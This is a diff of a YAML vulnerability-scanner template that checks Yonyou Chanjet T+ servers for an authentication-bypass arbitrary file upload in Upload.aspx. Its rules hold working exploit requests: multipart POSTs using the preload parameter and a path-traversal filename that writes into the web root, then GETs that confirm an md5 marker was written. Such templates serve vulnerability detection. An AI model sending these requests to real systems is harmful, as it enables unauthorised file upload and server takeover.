@@ -1,60 +1,51 @@
+expression: (r0() && r1()) || (r2() && r3())
 id: yonyou-chanjet-tplus-file-upload
-
 info:
-  name: 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞
   author: zan8in
+  description: "\u7528\u53CB \u7545\u6377\u901AT+ Upload.aspx\u63A5\u53E3\u5B58\u5728\
+    \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\
+    \u8FC7 preload \u53C2\u6570\u7ED5\u8FC7\u8EAB\u4EFD\u9A8C\u8BC1\u8FDB\u884C\u6587\
+    \u4EF6\u4E0A\u4F20\uFF0C\u63A7\u5236\u670D\u52A1\u5668\napp=\"\u7545\u6377\u901A\
+    -TPlus\"\n"
+  name: "\u7528\u53CB \u7545\u6377\u901AT+ Upload.aspx \u4EFB\u610F\u6587\u4EF6\u4E0A\
+    \u4F20\u6F0F\u6D1E"
+  reference:
+  - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20Upload.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
   severity: critical
   verified: true
-  description: |
-    用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器
-    app="畅捷通-TPlus"
-  reference:
-    - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20Upload.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
-
-set:
-  r1: randomLowercase(8)
-  md5str: md5(r1)
-  rboundary: randomLowercase(8)
 rules:
   r0:
+    expression: response.status == 200
     request:
-      method: POST
-      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"File1\"; filename=\"../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/{{r1}}.txt\"\
+        \r\nContent-Type: image/jpeg\r\n\r\n{{md5str}}\r\n------WebKitFormBoundary{{rboundary}}--\r\
+        \n"
       headers:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-      body: "\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"File1\"; filename=\"../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/{{r1}}.txt\"\r\n\
-        Content-Type: image/jpeg\r\n\
-        \r\n\
-        {{md5str}}\r\n\
-        ------WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: response.status == 200
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
   r1:
+    expression: response.body.bcontains(bytes(md5str))
     request:
       method: GET
       path: /tplus/{{r1}}.txt?preload=1
-    expression: response.body.bcontains(bytes(md5str))
   r2:
+    expression: response.status == 200
     request:
-      method: POST
-      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"File1\"; filename=\"{{r1}}.txt\"\r\nContent-Type: image/jpeg\r\n\r\
+        \n{{md5str}}\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
       headers:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-      body: "\
-        ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"File1\"; filename=\"{{r1}}.txt\"\r\n\
-        Content-Type: image/jpeg\r\n\
-        \r\n\
-        {{md5str}}\r\n\
-        ------WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: response.status == 200
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
   r3:
+    expression: response.body.bcontains(bytes(md5str))
     request:
       method: GET
       path: /tplus/SM/SetupAccount/images/{{r1}}.txt?preload=1
-    expression: response.body.bcontains(bytes(md5str))
-  
-expression: (r0() && r1()) || (r2() && r3())
+set:
+  md5str: md5(r1)
+  r1: randomLowercase(8)
+  rboundary: randomLowercase(8)
